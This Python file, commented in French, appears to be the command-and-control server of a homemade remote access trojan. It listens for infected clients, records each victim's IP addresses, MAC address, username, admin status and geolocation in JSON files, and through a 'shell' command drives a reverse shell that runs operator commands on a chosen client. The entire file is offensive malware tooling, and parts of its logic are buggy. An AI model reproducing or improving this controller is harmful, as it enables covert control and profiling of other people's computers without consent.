import socket
import os
import time
import json
from _thread import *


ServerSocket = socket.socket()
host = '127.0.0.1'
port = 1233

try:
    ServerSocket.bind((host, port))
except socket.error as e:
    print(str(e))

BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase

print('Waitiing for a Connection..')
ServerSocket.listen(5)

## Pour dans les fonction

current_sessions = 0
lcmd = ""
SEPARATOR = "<sep>"
test = ""
local = True


image = "\n\tooooooooooooo      oooooooooo.       ooooo      ooo      oooooooooooo      ooooooooooooo \n\
\t8'   888   `8      `888'   `Y8b      `888b.      8        888       8      8    888    8 \n\
\t     888            888     888       8 `88b.    8        888                   888      \n\
\t     888            888oooo888'       8   `88b.  8        888oooo8              888      \n\
\t     888            888    `88b       8     `88b.8        888                   888      \n\
\t     888            888    .88P       8       `888        888       o           888      \n\
\t    o888o          o888bood8P'       o8o        `8       o888ooooood8          o888o \n"


print(image)

menu_help = "\thelp -- Afficher le Menu d'aide\n\tshell [numero du client] -- Ouvrir un reverse shell sur un client. Exemple : shell 2\n"

def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation):
    client = {
    "client_num": client_num,
    "platform": platform,
    "public_ip": public_ip,
    "local_ip": local_ip,
    "mac_address": mac_address,
    "architecture": architecture,
    "device": device,
    "username": username,
    "administrator": administrator,
    "geolocation": geolocation
    }

    i = 1
    nom_fichier = "client"
    while nom_fichier == "client":
        if os.path.exists("client" + str(i) + ".txt"):
            print("le fichier existe")
        else:
            print("le fichier " + "client" + str(i) + " n'existe pas")
            nom_fichier = "client" + str(i)
        i = i + 1
    fichier = open(nom_fichier + ".txt", "w")
    fichier.write(json.dumps(client, indent=4))
    fichier.close

def LireClient(nom_fichier):
    fichier = open(nom_fichier, "r")
    data = json.load(fichier)
    print(data)
    fichier.close

def TrouverMac(nom_fichier):
    fichier = open(nom_fichier, "r")
    data = json.load(fichier)
    print(data["mac_address"])
    fichier.close
    return data["mac_address"]

def DefinirIdConn(macAdress):
    fichier = open(TestMacAddress(".", ".txt", macAdress)[1], "r")
    data = json.load(fichier)
    print(data["client_num"])
    fichier.close
    return data["client_num"]
        
def TestMacAddress(path,extension,macAddress):
    list_dir = []
    list_dir = os.listdir(path)
    count = 0
    for file in list_dir:
        if file.endswith(extension): # eg: '.txt'
            count += 1
            fileName, fileExtension = os.path.splitext(file)
            if TrouverMac(fileName + fileExtension) == macAddress:
                print("l'adresse mac corespond")
                return True, fileName + fileExtension
            else:
                print("l'adresse mac ne corespond pas")
    return False, fileName + fileExtension

def CountClients(path):
    list_dir = []
    list_dir = os.listdir(path)
    count = 0
    for file in list_dir:
        if file.endswith(".txt"): # eg: '.txt'
            count += 1
    return count

def threaded_client(connection, id_conn):
    global test
    pwd = connection.recv(BUFFER_SIZE).decode('utf-8')
    print("[+] Current working directory:", pwd)
    infos = connection.recv(BUFFER_SIZE).decode('utf-8')
    platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation, ipv4  = infos.split(SEPARATOR)
    #id_conn = selon macaddresse
    print("\t Platforme : " + platform + "\n\t Ip Public : " + public_ip + "\n\t Ip Local : " + local_ip + "\n\t Adresse Mac : " + mac_address + "\n\t Architecture : " + architecture + "\n\t Device : " + device + "\n\t Username : " + username + "\n\t Administrator : " + administrator+ "\n\t Geolocation : " + geolocation+ "\n\t Ipv4 : " + ipv4)
    if TestMacAddress(".", ".txt", mac_address)[0] == False:
        print("Nouveau Client !")
        InscrireClient(id_conn, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation)
    else:
        print("Client existe deja, num par defaut : " + str(id_conn))
        id_conn = DefinirIdConn(mac_address)
        print("Nouveau id : " + str(id_conn))


        
    while True:
        if "shell" in test:
            if str(id_conn) in test:
                global current_sessions
                current_sessions = id_conn
                print("prise en main de la sessions " + str(id_conn) + "\n")
                while True:
                    if current_sessions == id_conn:
                        cmd = input(f"{str(id_conn)} : {pwd} $> ")
                        if cmd != "":
                            #print("pas egale a rien")
                            print(cmd)
                            if "exit" in cmd:
                                global local
                                local = True
                                
                                test = ""
                                current_sessions = 0
                                print(str(local) + str(current_sessions) + test)
                                print("Fermeture de la session : " + str(id_conn))
                                break
                            else:
                                connection.sendall(str.encode(cmd))
                                output = connection.recv(BUFFER_SIZE).decode('utf-8', "ignore")
                                results, pwd = output.split(SEPARATOR)
                                print(results)
                        #else:
                            ##print("egale a rien")

                            

        #data = connection.recv(2048)
        #reply = 'Server Says: ' + test + " " + data.decode('utf-8')
        #if not data:
            #break
        #connection.sendall(str.encode(reply))
        #print("fin de boucle")
    connection.close()

def AfficherClients(path):
    list_dir = []
    list_dir = os.listdir(path)
    for file in list_dir:
        if file.endswith(".txt"): # eg: '.txt'
            fileName, fileExtension = os.path.splitext(file)
            with open(fileName + fileExtension, "r") as file:

                data = json.load(file)
                client_num = data["client_num"]
                platform = data["platform"]
                public_ip = data["public_ip"]
                local_ip = data["local_ip"]
                mac_address = data["mac_address"]
                architecture = data["architecture"]
                device = data["device"]
                username = data["username"]
                administrator = data["administrator"]
                geolocation = data["geolocation"]
                file.close()
                print("\t\tListe clients :")
                print("\nNumero Client : %s\n\tPlatform : %s\
                \n\tPublic ip : %s\n\tLocal ip : %s\n\tMac address : %s\n\tArchitecture : %s\
                \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s" \
                % (client_num, platform,public_ip, local_ip,mac_address, architecture,\
                device, username,administrator, client_num,))

def prompt():
    global local
    local = True
    global test
    test = ""
    while True:
        if local == True:
            if current_sessions == 0:  
                lcmd = input("local : ")
                #print(lcmd + " local")
                test = lcmd
                print(test)
                if "help" in lcmd:
                    print(menu_help)
                if "exit" in lcmd:
                    break
                if "clients" in lcmd:
                    AfficherClients(".")
                lcmd = ""
                if "shell" in lcmd:
                    test = ""
                    lcmd = ""
                    local = False

ThreadCount = CountClients(".")

start_new_thread(prompt, ())
while True:
    Client, address = ServerSocket.accept()
    print('Connected to: ' + address[0] + ':' + str(address[1]) + "\n")
    ThreadCount += 1
    start_new_thread(threaded_client, (Client, ThreadCount))
    print('Thread Number: ' + str(ThreadCount))
ServerSocket.close()
